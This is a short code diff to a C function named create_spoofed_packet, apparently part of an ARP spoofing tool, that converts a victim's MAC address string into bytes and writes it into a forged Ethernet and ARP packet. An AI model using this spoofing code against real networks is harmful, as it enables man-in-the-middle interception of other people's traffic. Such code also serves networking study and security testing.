@@ -102,9 +102,17 @@ char *create_spoofed_packet(arp_hdr_t *arp_hdr,
     arp_hdr_t *arp_header = (arp_hdr_t *)(packet + ETHHDR_LEN);
     uint32_t target_ip = inet_addr(params->dest_ip);
     uint32_t source_ip = inet_addr(params->source_ip);
+    char victim[6] = {
+            hexadecimal_to_decimal(getnbr(&victim_addr[0])),
+            hexadecimal_to_decimal(getnbr(&victim_addr[3])),
+            hexadecimal_to_decimal(getnbr(&victim_addr[6])),
+            hexadecimal_to_decimal(getnbr(&victim_addr[9])),
+            hexadecimal_to_decimal(getnbr(&victim_addr[12])),
+            hexadecimal_to_decimal(getnbr(&victim_addr[15]))
+    };
 
-    memcpy(eth_header->h_dest, victim_addr, MACADDR_LEN);
-    memcpy(arp_header->target_mac, victim_addr, MACADDR_LEN);
+    memcpy(eth_header->h_dest, victim, MACADDR_LEN);
+    memcpy(arp_header->target_mac, victim, MACADDR_LEN);
     memcpy(eth_header->h_source, arp_hdr->source_mac, MACADDR_LEN);
     memcpy(arp_header->source_mac, arp_hdr->source_mac, MACADDR_LEN);
     memcpy(arp_sockaddr->sll_addr, arp_hdr->source_mac, MACADDR_LEN);
